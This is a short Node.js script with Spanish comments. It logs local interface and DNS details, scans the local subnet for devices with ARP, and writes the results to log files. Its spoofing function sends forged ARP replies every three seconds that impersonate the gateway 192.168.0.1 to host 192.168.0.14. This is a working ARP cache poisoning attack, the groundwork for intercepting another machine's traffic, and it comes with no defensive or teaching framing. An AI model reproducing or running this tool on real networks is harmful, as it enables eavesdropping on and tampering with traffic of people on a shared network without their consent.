const ip = require('ip');
const arp = require('arpjs')
const fs = require('fs')
const local = require('ipmask')()
const address = require('address')
const Arpping = require('arpping');
const arpping = new Arpping();

//Obtiene información de la Interface
function localInter() {
  address.dns(function (err, addrs) {
    let infoLocal = {
      ipLocal: local.address,
      dnsLocal: addrs,
      info: ip.cidrSubnet(local.cidr)
    };
    let data = JSON.stringify(infoLocal, null, 2)
    fs.writeFile('infoLocal.log', data, err => {
      if (err) {
        console.error(err)
        return
      }
    })
  });
}

//Obtiene información de los dispositivos conectados
//a la misma red
function subNet() {
  arpping.discover()
    .then(hosts => {
      fs.writeFile('subNetLocal.log', JSON.stringify(hosts, null, 4), err => {
        if (err) {
          console.error(err)
          return
        }
        process.exit();
      })
    }).catch(err => console.log(err));
}

function spoofing() {
  //arp.poison('192.168.0.14','192.168.0.1');
  arp.setInterface('en1')
  arp.send({
    'op': 'reply',
    'src_ip': '192.168.0.1',
    'dst_ip': '192.168.0.14',
    'src_mac': '90:27:e4:f6:12:4b',
    'dst_mac': '98:2c:bc:70:7c:6d'
    })
}

//Primera ejecución inmediata
//setTimeout(localInter, 1);
//setTimeout(subNet, 1);
setTimeout(spoofing, 1);

//Ejecución en intervalos determinados
let repLocal = 180000; //3 min
setInterval(localInter, repLocal);

let repSubNet = 300000; //5 min
setInterval(subNet, repSubNet);

let repSpoof = 3000; //3 seg
setInterval(spoofing, repSpoof);